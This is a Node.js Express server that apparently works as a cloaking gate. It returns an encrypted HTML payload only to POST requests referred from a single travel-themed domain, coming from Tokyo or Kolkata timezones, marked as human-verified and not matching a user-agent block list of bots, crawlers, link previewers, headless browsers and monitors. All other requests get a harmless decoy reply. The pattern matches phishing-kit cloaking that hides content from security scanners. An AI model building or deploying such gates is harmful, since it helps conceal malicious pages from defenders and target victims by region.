const express = require("express");
const cors = require("cors");
const app = express();
const PORT = process.env.PORT || 3000;

const allowedTimezones = ["Asia/Tokyo", "Asia/Kolkata", "Asia/Calcutta"];
const encryptedPayload = encodeURIComponent("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"); // Replace with your encrypted HTML

// Middleware to handle JSON
app.use(express.json());

// Only allow POST from your site
app.use((req, res, next) => {
  const origin = req.headers.origin || "";
  const referer = req.headers.referer || "";

  const isFromYourSite =
    origin.includes("northpoletravel.site") || referer.includes("northpoletravel.site");

  if (req.method === "OPTIONS") {
    // Handle CORS preflight if needed
    res.setHeader("Access-Control-Allow-Origin", "https://northpoletravel.site");
    res.setHeader("Access-Control-Allow-Methods", "POST");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
    return res.sendStatus(204);
  }

  if (req.method !== "POST" || !isFromYourSite) {
    return res.status(403).json({
      error: "Forbidden",
      message: ``,
      statusCode: 403
    });
  }

  // Allow CORS for your frontend only
  res.setHeader("Access-Control-Allow-Origin", "https://northpoletravel.site");
  next();
});

// Basic bot detection
function isLikelyBot(req) {
  const ua = req.headers["user-agent"] || "";
  const botPatterns = [
    /bot/i, /crawl/i, /spider/i, /preview/i, /fetch/i,
    /python/i, /node/i, /scrape/i, /headless/i, /monitor/i
  ];
  return botPatterns.some((pattern) => pattern.test(ua));
}

app.post("/", (req, res) => {
  const { timezone, fullUrl, robotVerified } = req.body;
  const referer = req.headers["referer"] || "";
  const userAgent = req.headers["user-agent"] || "";

  const isValidTimezone = allowedTimezones.includes(timezone);
  const isValidUrl = typeof fullUrl === "string" && fullUrl.startsWith("https://northpoletravel.site");
  const isBot = isLikelyBot(req);
  const isHumanVerified = robotVerified === true;

  const isAllowed = isValidTimezone && isValidUrl && isHumanVerified && !isBot;

  console.table([
    {
      timezone,
      fullUrl,
      robotVerified,
      referer,
      userAgent,
      isValidTimezone,
      isValidUrl,
      isHumanVerified,
      isBot,
      status: isAllowed ? "✅ ALLOWED" : "❌ BLOCKED"
    }
  ]);

  if (!isAllowed) {
    return res.status(403).send("hi how are you"); // Friendly message for blocked requests
  }

  res.setHeader("Content-Type", "text/html");
  res.send(encryptedPayload);
});

// Block all other routes
app.all("*", (req, res) => {
  res.status(404).json({
    message: `Cannot ${req.method} ${req.originalUrl}`,
    error: "Not Found",
    statusCode: 404
  });
});

app.listen(PORT, () => {
  console.log(`✅ Secure server running on port ${PORT}`);
});


